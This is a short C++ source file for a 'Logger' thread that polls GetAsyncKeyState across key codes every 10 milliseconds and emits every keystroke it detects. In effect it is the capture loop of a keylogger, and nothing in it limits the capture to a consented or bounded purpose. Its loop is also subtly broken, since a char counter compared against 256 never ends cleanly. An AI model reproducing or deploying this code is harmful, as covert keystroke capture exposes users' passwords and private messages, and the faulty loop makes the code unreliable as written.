#include "logger.h"

void Logger::run() {
    char input;
    while (true) {
        msleep(10);
        for (input = 8; input < 256; input++) {
            if (GetAsyncKeyState(input) == -32767) {
                emit keyPressed(input);
            }
        }
    }
}

void Logger::stopLoggingThread() {
    terminate();
}

